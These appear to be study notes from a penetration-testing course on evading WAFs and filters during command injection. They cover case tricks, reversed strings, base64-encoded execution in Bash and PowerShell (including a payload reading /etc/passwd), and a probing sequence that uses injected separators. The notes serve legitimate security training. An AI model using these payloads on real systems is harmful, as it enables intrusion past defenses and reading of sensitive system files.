ğŸ§  SUMMARY: Advanced Command Obfuscation
When basic injection bypasses donâ€™t work (quotes, ${IFS}, newlines, etc.), it's time to get creative. This section teaches how to sneak past WAFs and aggressive filters with:

Case Manipulation

Reversed Commands

Encoded Payloads

Shell Tricks in Bash & PowerShell

Youâ€™re not just throwing whoami at the wall anymore â€” youâ€™re forging new words that execute like old ones.

ğŸ” IF THIS, THEN THAT (ITTTT)
IF THIS	DO THAT
Filter blocks your command like whoami, cat, etc.	Try case manipulation (e.g., WhOaMi)
Still filtered (Linux)?	Use $(tr "[A-Z]" "[a-z]"<<<"WhOaMi") or ${a,,}
WAF flags known words even with casing	Reverse the string using rev or PowerShell slice
WAF filters characters (`	, ;, `, etc.)
Bash-specific system	Use Bash subshells $(...), <<<, tr, rev, etc.
PowerShell-specific system	Use iex "$(...)" with b64 + Unicode encoding
Filters catch b64 or base64 usage	Swap in sh, openssl enc -d -base64, or hex via xxd
ğŸ§ª TECHNIQUES & TOOLS
1. ğŸ”¡ Case Manipulation
Windows: Just change case. WhOaMi, WHOAMI, whatever.

Linux: Bash is case-sensitive, so wrap with lowercase trick:

bash
Copy
Edit
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
$(a="WhOaMi";printf %s "${a,,}")
2. ğŸ” Reversed Commands
Reverse the command using rev (Linux) or slicing (PowerShell):

bash
Copy
Edit
$(rev<<<'imaohw')
powershell
Copy
Edit
iex "$('imaohw'[-1..-20] -join '')"
3. ğŸ” Encoded Commands (Base64)
ğŸ§ Linux:
Encode your real command:

bash
Copy
Edit
echo -n 'cat /etc/passwd | grep 33' | base64
Output: Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==

Decode + execute:

bash
Copy
Edit
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
âœ… No |, no ;, no spaces.

ğŸªŸ Windows:
Encode:

powershell
Copy
Edit
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
Decode + execute:

powershell
Copy
Edit
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
ğŸ”„ PATTERNS TO MEMORIZE
Goal	Pattern
Lowercase obfuscation	$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
Reverse command	$(rev<<<'imaohw')
Base64 decode + execute	bash<<<$(base64 -d<<<...)
PowerShell base64 exec	iex "$(...decode logic...)â€
Hide command keywords	w'h'o'am'i, w"h"o'am"i
ğŸ§¨ FINAL THOUGHTS
â—ï¸These techniques are surgical. They're used when:

You're up against a solid WAF.

Youâ€™re in a real-world pentest.

Youâ€™re taking CPTS, OSCP, or doing CTFs that punish â€œbasicâ€ payloads.

ğŸ’€ Most devs never expect:

Custom encoded payloads

Character slicing

Rev-based reversal

Bash/PowerShell hybrid voodoo

ğŸ§° Tools to Automate All This (Later Section Will Cover)
obfs4, Invoke-Obfuscation, Obfuscator.io

PayloadsAllTheThings â†’ Command Injection, Bash Tricks, PowerShell Obfuscation



ğŸ’¡ TL;DR:
Yes, it's mostly â€œthrow it at the wall and see what sticksâ€ at first â€” but there are clues and logic you can follow before brute-force creativity kicks in.

ğŸ§  Step-by-Step Flow (What to Try and When):
1. Initial Recon & Payload Test
Try a basic: 127.0.0.1; whoami

If blocked â†’ look at:

Error returned (custom app message? WAF page?)

Does it still ping? (might tell you partial command was accepted)

2. Try Basic Operators First
;, &&, ||, %0a

See whatâ€™s allowed. Youâ€™ll quickly know what chars are being filtered.

3. Space Bypass Attempts
${IFS}, %09, {ls,-la}

If whoami works, but not with a space: you know itâ€™s a space filter.

4. Command Word Blocked?
Test w'h'o'am'i, w"h"oami, who$@ami, etc.

If those work: itâ€™s a blacklisted word, not behavior.

ğŸ§¬ If That Fails â†’ Advanced Obfuscation Mode
At this point, you're in creative territory. Hereâ€™s when to try the fancy stuff:

Technique	When to Try
Reversing (rev)	If literal whoami is blacklisted
Case Manipulation	If blacklists are lowercase-only
Base64 Encoded	If special chars are filtered, like `
Char-by-char (tr)	If words are blocked but alphabet isnâ€™t
Command building (string concat)	If full words donâ€™t fly, but individual letters do
ğŸ› ï¸ Think of it like Lockpicking:
Start with simple tools (tension + rake)

If it doesnâ€™t budge â†’ go custom: single-pin picking, weird angles

Your ears (or here, responses) tell you what the lock is doing

âš”ï¸ CPTS Mindset:
If you see command injection works, you WILL get a shell. You just gotta pivot around whatever clown-ass filter the dev tossed in.

No filter can stop you â€” just slow you down. But slowing down the wrong guy is still a losing game.


